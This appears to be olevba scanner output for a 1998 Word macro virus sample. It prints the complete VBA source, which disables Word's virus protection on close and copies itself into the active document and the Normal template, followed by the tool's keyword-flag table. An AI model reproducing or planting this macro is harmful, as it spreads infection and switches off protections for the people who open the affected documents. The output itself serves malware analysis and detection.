olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Fs.l-5a02f73bb95210bbefed0b35b094390a002a20e2
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Fs.l-5a02f73bb95210bbefed0b35b094390a002a20e2 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Copyright (C) 1998 by FlyShadow ~^^~ - Semis
Private Sub Document_Close(): On Error Resume Next
Options.VirusProtection = &H0: Options.SaveNormalPrompt = &H0
Set Łd = ThisDocument.VBProject.VBComponents(1).CodeModule: Łh = Łd.Lines(1, 1)
With ActiveDocument.VBProject.VBComponents(1).CodeModule
If Łh <> .Lines(1, 1) Then .DeleteLines 1, .CountOfLines: .AddFromString Łd.Lines(1, 11)
End With
With NormalTemplate.VBProject.VBComponents(1).CodeModule
If Łh <> .Lines(1, 1) Then .DeleteLines 1, .CountOfLines: .AddFromString Łd.Lines(1, 11)
End With
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

